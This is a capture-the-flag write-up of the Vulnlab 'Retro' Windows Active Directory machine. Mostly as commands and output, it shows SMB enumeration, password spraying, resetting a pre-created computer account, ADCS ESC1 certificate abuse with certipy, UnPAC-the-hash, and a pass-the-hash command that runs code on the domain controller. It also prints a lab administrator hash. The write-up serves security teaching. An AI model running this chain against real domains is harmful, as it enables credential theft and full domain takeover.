---
title: "Vulnlab - Retro [Easy]"
category: ctf-writeup
layout: post
---
Retro is an easy windows (active directory) machine by Vulnlab.

> I've tried to show as many methods as possible to retrieve the same thing, for example retrieving the administrator's NTLM hash and changing the password for a user with 2 different methods, I hope that you can learn more that way which is the whole point of this write-up!

# Enumeration

Started with a simple nmap scan:

```
syl@sylsec:~/vulnlab/Retro$ nmap -p- -sT -v -A --open -T 4 --script vuln* -oN ^Cap.txt -sC -sV 10.10.64.243 -Pn --min-rate 10000
...
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=12/19%Time=6581A887%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
...
```

Next I've used enum4linux which showed me the FQDN, Domain and not much else.

```
syl@sylsec:~/vulnlab/Retro$ enum4linux 10.10.64.243
NetBIOS computer name: DC
NetBIOS domain name: RETRO
DNS domain: retro.vl
FQDN: DC.retro.vl
Derived membership: domain member
Derived domain: RETRO
```

Then I went on to enumerate the SMB protocol.

```
syl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u 'Guest' -p '' --shares
SMB         10.10.64.243    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.64.243    445    DC               [+] retro.vl\Guest: 
SMB         10.10.64.243    445    DC               [*] Enumerated shares
SMB         10.10.64.243    445    DC               Share           Permissions     Remark
SMB         10.10.64.243    445    DC               -----           -----------     ------
SMB         10.10.64.243    445    DC               ADMIN$                          Remote Admin
SMB         10.10.64.243    445    DC               C$                              Default share
SMB         10.10.64.243    445    DC               IPC$            READ            Remote IPC
SMB         10.10.64.243    445    DC               NETLOGON                        Logon server share 
SMB         10.10.64.243    445    DC               Notes                           
SMB         10.10.64.243    445    DC               SYSVOL                          Logon server share 
SMB         10.10.64.243    445    DC               Trainees        READ            
```

I went in and checked the readable share "Trainees" and I got the file `Important.txt` which contained the following text:

```
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```

That is definitely interesting it does hint that there may be weak credentials, so let's try to enumerate some users. Since that the account "Guest" is working, I used the `lookupsid` by the impacket's scripts.

```
syl@sylsec:~/tools/impacket/examples$ python3 lookupsid.py Guest@10.10.64.243
Impacket v0.12.0.dev1+20230921.20754.9c8f344b - Copyright 2023 Fortra

Password:
[*] Brute forcing SIDs at 10.10.64.243
[*] StringBinding ncacn_np:10.10.64.243[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: RETRO\Administrator (SidTypeUser)
501: RETRO\Guest (SidTypeUser)
502: RETRO\krbtgt (SidTypeUser)
512: RETRO\Domain Admins (SidTypeGroup)
513: RETRO\Domain Users (SidTypeGroup)
514: RETRO\Domain Guests (SidTypeGroup)
515: RETRO\Domain Computers (SidTypeGroup)
516: RETRO\Domain Controllers (SidTypeGroup)
517: RETRO\Cert Publishers (SidTypeAlias)
518: RETRO\Schema Admins (SidTypeGroup)
519: RETRO\Enterprise Admins (SidTypeGroup)
520: RETRO\Group Policy Creator Owners (SidTypeGroup)
521: RETRO\Read-only Domain Controllers (SidTypeGroup)
522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
525: RETRO\Protected Users (SidTypeGroup)
526: RETRO\Key Admins (SidTypeGroup)
527: RETRO\Enterprise Key Admins (SidTypeGroup)
553: RETRO\RAS and IAS Servers (SidTypeAlias)
571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
1000: RETRO\DC$ (SidTypeUser)
1101: RETRO\DnsAdmins (SidTypeAlias)
1102: RETRO\DnsUpdateProxy (SidTypeGroup)
1104: RETRO\trainee (SidTypeUser)
1106: RETRO\BANKING$ (SidTypeUser)
1107: RETRO\jburley (SidTypeUser)
1108: RETRO\HelpDesk (SidTypeGroup)
1109: RETRO\tblack (SidTypeUser)
```

We got a couple of users:

```
1000: RETRO\DC$ (SidTypeUser)
1104: RETRO\trainee (SidTypeUser)
1106: RETRO\BANKING$ (SidTypeUser)
1107: RETRO\jburley (SidTypeUser)
1109: RETRO\tblack (SidTypeUser)
```

I've stripped the users and added them to users.txt with the addition of 'administrator'. Since I knew that there would be weak credentials, I tried with the following pattern `user:pass`.

```
syl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u ./users.txt -p ./users.txt 
SMB         10.10.64.243    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.64.243    445    DC               [+] retro.vl\trainee:trainee
```

And I've got a hit for the user `trainee`. Now let's try to get the SMB shares once again with that user.

```
syl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u trainee -p trainee --shares
SMB         10.10.64.243    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.64.243    445    DC               [+] retro.vl\trainee:trainee 
SMB         10.10.64.243    445    DC               [*] Enumerated shares
SMB         10.10.64.243    445    DC               Share           Permissions     Remark
SMB         10.10.64.243    445    DC               -----           -----------     ------
SMB         10.10.64.243    445    DC               ADMIN$                          Remote Admin
SMB         10.10.64.243    445    DC               C$                              Default share
SMB         10.10.64.243    445    DC               IPC$            READ            Remote IPC
SMB         10.10.64.243    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.64.243    445    DC               Notes           READ            
SMB         10.10.64.243    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.64.243    445    DC               Trainees        READ  
syl@sylsec:~/vulnlab/Retro$ smbclient //retro.vl/Notes -U 'trainee'                                   
Password for [WORKGROUP\trainee]: trainee
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul 24 01:03:16 2023
  ..                                DHS        0  Wed Jul 26 12:54:14 2023
  ToDo.txt                            A      248  Mon Jul 24 01:05:56 2023

                6261499 blocks of size 4096. 2179053 blocks available
smb: \> get Todo.txt
getting file \Todo.txt of size 248 as Todo.txt (1,5 KiloBytes/sec) (average 1,5 KiloBytes/sec)
```

I got a file `Todo.txt` lets take a look:

```
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
```

This text file hints that there is some ancient banking software and some pre-created computer account, judging by that I can safely assume that they are talking about the account `BANKING$`, I tried onec again some weak credentials like `$BANKING:banking` and I got this result:

```
syl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u BANKING$ -p 'banking'
SMB         10.10.64.243    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.64.243    445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
```

The result I got is `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` which means that the password is correct! (REF: https://trustedsec.com/blog/diving-into-pre-created-computer-accounts)
But I cannot use this account until the password is changed, so lets do that. There is `changepasswd.py` by Impacket (https://github.com/fortra/impacket/blob/master/examples/changepasswd.py) which I can use to change the password via RPC, the thing that I need is another user, which I already have (`trainee`). There are other methods to change the password like `kpasswd` as well.

## Change the password via RPC (imapcket's changepasswd.py) Method #1

```
(impacket-env) syl@sylsec:~/tools/impacket/examples$ python changepasswd.py retro.vl/'BANKING$':'banking'@10.10.64.243 -altuser trainee -altpass trainee
Impacket v0.12.0.dev1+20230921.20754.9c8f344b - Copyright 2023 Fortra

New password: 
Retype new password: Summer2018!
[!] Attempting to *change* the password of retro.vl/BANKING$ as retro.vl/trainee. You may want to use '-reset' to *reset* the password of the target.
[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\trainee
[*] Password was changed successfully.
```

## Using `kpasswd` Method #2

I can go with the LDAP way of chaning the password using the binary `kpasswd` and since this is uncommon on Linux you can install it with:

```
syl@sylsec:~/tools/$ sudo apt install krb5-user
```

Then you have to edit the realms in the `/etc/krb5.conf`

```ini
[libdefaults]
        default_realm = RETRO.VL
        dns_lookup_realm = false
        ticket_lifetime = 24h
        renew_lifetime = 7d
        rdns = false
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true

[realms]
        RETRO.VL = {
                kdc = DC.RETRO.VL
                admin_server = DC.RETRO.VL
        }
[domain_realm]
        .retro.vl = RETRO.VL
```

And then simply invoke `kpasswd`

```
syl@sylsec:~/vulnlab/Retro$ sudo kpasswd BANKING$
Password for BANKING$@RETRO.VL: 
Enter new password: 
Enter it again: 
Password changed.
```

And now we can use this account!

Lets enumerate the ADCS (Active Directory Certificate Services). I used `certipy` for that matter.

```
syl@sylsec:~/vulnlab/Retro$ certipy find -u trainee -p 'trainee' -dc-ip 10.10.113.62 -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'retro-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'retro-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'retro-DC-CA' via RRP
[*] Got CA configuration for 'retro-DC-CA'
[*] Saved BloodHound data to '20231219202428_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20231219202428_Certipy.txt'
[*] Saved JSON output to '20231219202428_Certipy.json'
```

Looking at the `20231219202428_Certipy.txt` we can see a ESC1 vunlerability related to the `RetroClients` certificate. More about ESC1: https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/

Looking at the permissions of the certificate template we notice that it can be used only by:
- RETRO.VL\Domain Admins
- RETRO.VL\Enterprise Admins
- RETRO.VL\Domain Computers

I believe that the user `BANKING$` is within those groups so lets see:


```
syl@sylsec:~/vulnlab/Retro$ bloodhoundpy -dc retro.vl -u trainee -p trainee -d retro.vl
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Getting TGT for user
INFO: Connecting to LDAP server: retro.vl
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Found 7 users
INFO: Connecting to LDAP server: retro.vl
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 53 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: DC.retro.vl
INFO: Done in 00M 04S
```

Then I can query the user `BANKING$` and I can see its `First Degree Group Membership` that this user is part of the group `DOMAIN COMPUTERS`, so we can use that user to exploit the certificate and retrieve the NTLM hash.

# UnPAC the hash Method #1

We can use the technique UnPAC the hash to get the NTLM hash using the <a target="_blank" href="https://github.com/dirkjanm/PKINITtools">PKINITtools</a>.

First we need to retrieve the TGT and the AS-REP encryption key

```
syl@sylsec:~/vulnlab/Retro/temp$ gettgtpkinit -cert-pfx ../exfiltrated/administrator.pfx -dc-ip 10.10.113.62 retro.vl/administrator ../exfiltrated/administrator.ccache 
2023-12-19 20:53:00,328 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2023-12-19 20:53:00,802 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2023-12-19 20:53:00,889 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2023-12-19 20:53:00,889 minikerberos INFO     23f920ec14a57021c38d9c8c806ce53929774cf8a79d23049587624d2b7378ec
INFO:minikerberos:23f920ec14a57021c38d9c8c806ce53929774cf8a79d23049587624d2b7378ec
2023-12-19 20:53:00,895 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Then we can use the `getnthash.py` to retrieve the NTLM hash.

```
syl@sylsec:~/vulnlab/Retro/exfiltrated$  getnthash retro.vl/administrator -key 23f920ec14a57021c38d9c8c806ce53929774cf8a79d23049587624d2b7378ec   
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
25....<hash>
```

# Using Certipy Method #2

```
syl@sylsec:~/vulnlab/Retro$ certipy req -u 'BANKING$' -p 'Summer2018!' -dc-ip '10.10.64.243' -target 'dc.retro.vl' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator' -key-size 4096
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 13
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

syl@sylsec:~/vulnlab/Retro$ certipy auth -pfx ./exfiltrated/administrator.pfx -dc-ip '10.10.64.243' -username 'administrator' -domain retro.vl
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@retro.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:25<hash>
```

Then we can use that that hash for PTH (Pass the hash) attack.

```
syl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u administrator -H 252fac7066d93dd009d4fd2cd0368389 -x "cmd /c type C:\Users\Administrator\Desktop\root.txt"
SMB         10.10.64.243    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.64.243    445    DC               [+] retro.vl\administrator:252fac7066d93dd009d4fd2cd0368389 (Pwn3d!)
SMB         10.10.64.243    445    DC               [+] Executed command via wmiexec
SMB         10.10.64.243    445    DC               VL{<hash>}
```